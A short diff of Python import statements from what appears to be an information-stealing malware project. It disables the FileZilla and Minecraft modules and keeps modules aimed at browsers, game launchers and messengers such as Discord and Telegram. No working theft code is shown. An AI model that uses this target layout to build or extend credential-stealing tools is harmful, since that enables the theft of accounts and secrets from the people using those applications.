@@ -1,5 +1,5 @@
 from targets.files.files import TxtFiles
-from targets.files.filezilla import FileZilla
+# from targets.files.filezilla import FileZilla
 from targets.files.file_grabber import Grab
 from targets.browsers.chromium import Chromium
 from targets.browsers.geckodriver import GeckoDriver
@@ -7,7 +7,7 @@ from targets.games.steam import Steam
 from targets.games.epicgames import Epic
 from targets.games.uplay import Ubisoft
 from targets.games.battlenet import BattleNet
-from targets.games.minecraft import Minecraft
+# from targets.games.minecraft import Minecraft
 from targets.messengers.discord import Discord
 from targets.messengers.telegram import Telegram
 from targets.messengers.viber import Viber
